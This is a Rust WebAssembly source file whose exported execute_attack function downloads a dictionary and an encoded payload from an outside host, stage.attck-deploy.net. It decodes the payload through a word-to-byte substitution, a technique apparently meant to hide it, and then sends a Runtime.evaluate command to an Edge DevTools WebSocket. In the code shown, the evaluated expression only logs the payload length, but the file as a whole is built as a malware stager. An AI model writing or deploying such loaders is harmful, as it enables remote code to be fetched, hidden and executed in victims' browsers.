use wasm_bindgen::prelude::*;
use web_sys::{console, Request, RequestInit, Response};
use wasm_bindgen_futures::JsFuture;
use js_sys::{Uint8Array, JSON};
use console_error_panic_hook;
use std::collections::HashMap;

#[wasm_bindgen(module = "ws_bridge.js")]
extern "C" {
    fn send_to_edge(json: &str);
}

#[wasm_bindgen(start)]
pub fn start() -> Result<(), JsValue> {
    console_error_panic_hook::set_once();
    Ok(())
}

async fn fetch_and_cache_dictionary() -> Result<Vec<String>, JsValue> {
    console::log_1(&"Fetching and caching dictionary.txt...".into());

    let window = web_sys::window().unwrap();
    let storage = window.session_storage()?.unwrap();

    if let Some(cached_dict) = storage.get_item("dictionary_cache")? {
        console::log_1(&"Using cached dictionary".into());
        let dict_words: Vec<String> = serde_wasm_bindgen::from_value(
            JSON::parse(&cached_dict)?
        )?;
        return Ok(dict_words);
    }

    let opts = RequestInit::new();
    opts.set_method("GET");

    let request = Request::new_with_str_and_init(
        "https://stage.attck-deploy.net/es-dictionary.txt", 
        &opts
    )?;

    let resp_value = JsFuture::from(window.fetch_with_request(&request)).await?;
    let resp: Response = resp_value.dyn_into()?;

    if !resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error fetching dictionary: HTTP status {}",
            resp.status()
        )));
    }

    let text = JsFuture::from(resp.text()?).await?;
    let text_str = text.as_string().unwrap();

    let dict_words: Vec<String> = text_str
        .lines()
        .map(|line| line.trim().to_string())
        .collect();

    if dict_words.len() != 257 {
        return Err(JsValue::from_str(&format!(
            "Invalid dictionary: expected 257 words, got {}",
            dict_words.len()
        )));
    }

    let json_str = JSON::stringify(&serde_wasm_bindgen::to_value(&dict_words)?)?;
    let json_string = json_str.as_string().unwrap();
    storage.set_item(
        "dictionary_cache", 
        &json_string
    )?;

    console::log_1(&format!("Dictionary cached with {} words", dict_words.len()).into());
    Ok(dict_words)
}

async fn download_payload() -> Result<Vec<u8>, JsValue> {
    console::log_1(&"Downloading payload...".into());

    let opts = RequestInit::new();
    opts.set_method("GET");

    let window = web_sys::window().unwrap();
    let request = Request::new_with_str_and_init(
        "https://stage.attck-deploy.net/load.txt", 
        &opts
    )?;

    let resp_value = JsFuture::from(window.fetch_with_request(&request)).await?;
    let resp: Response = resp_value.dyn_into()?;

    if !resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error fetching payload: HTTP status {}",
            resp.status()
        )));
    }

    let buffer = JsFuture::from(resp.array_buffer()?).await?;
    let uint8_array = Uint8Array::new(&buffer);
    Ok(uint8_array.to_vec())
}

fn decode_payload(payload: &[u8], dictionary: &[String]) -> Result<Vec<u8>, JsValue> {
    console::log_1(&"Decoding payload...".into());

    let mut word_to_byte = HashMap::new();
    for (i, word) in dictionary.iter().enumerate() {
        word_to_byte.insert(word.clone(), i as u8);
    }

    let payload_str = String::from_utf8_lossy(payload);
    let encoded_words: Vec<&str> = payload_str.split_whitespace().collect();

    let mut decoded_bytes = Vec::new();
    for word in encoded_words {
        if let Some(&byte) = word_to_byte.get(word) {
            decoded_bytes.push(byte);
        } else {
            return Err(JsValue::from_str(&format!(
                "Decoding error: word '{}' not found in dictionary",
                word
            )));
        }
    }

    console::log_1(&format!("Decoded payload: {} bytes", decoded_bytes.len()).into());
    Ok(decoded_bytes)
}

#[wasm_bindgen]
pub async fn execute_attack() -> Result<JsValue, JsValue> {
    let dictionary = fetch_and_cache_dictionary().await?;
    let payload = download_payload().await?;
    let decoded = decode_payload(&payload, &dictionary)?;

    let eval_payload = format!(
        r#"{{\"id\":1,\"method\":\"Runtime.evaluate\",\"params\":{{\"expression\":\"console.log('Payload length: {}')\"}}}}"#,
        decoded.len()
    );
    send_to_edge(&eval_payload);

    Ok(JsValue::from_str("Payload forwarded to Edge DevTools WebSocket"))
}

#[wasm_bindgen]
pub fn log_error(msg: String) {
    console::error_1(&JsValue::from_str(&msg));
}
